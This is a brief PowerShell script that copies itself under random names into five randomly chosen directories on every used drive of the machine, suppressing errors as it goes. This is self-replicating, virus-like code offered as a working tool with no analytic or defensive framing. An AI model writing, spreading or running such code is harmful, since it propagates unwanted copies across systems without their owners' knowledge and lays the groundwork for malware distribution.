# Get the current script's full path
$scriptPath = $MyInvocation.MyCommand.Path

# Function to randomly select directories
function Get-RandomDirectories {
    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -gt 0 }
    $randomDirs = @()

    foreach ($drive in $drives) {
        $randomDirs += Get-ChildItem -Path $drive.Root -Directory -Recurse -ErrorAction SilentlyContinue |
                       Get-Random -Count 5
    }
    return $randomDirs
}

# Randomly select directories for replication
$directories = Get-RandomDirectories

# Replicate the script to these directories
foreach ($dir in $directories) {
    try {
        $destination = Join-Path -Path $dir.FullName -ChildPath "Copy_$(Get-Random).ps1"
        Copy-Item -Path $scriptPath -Destination $destination -Force
        Write-Output "Replicated to: $destination"
    } catch {
        Write-Output "Failed to copy to $($dir.FullName): $_"
    }
}
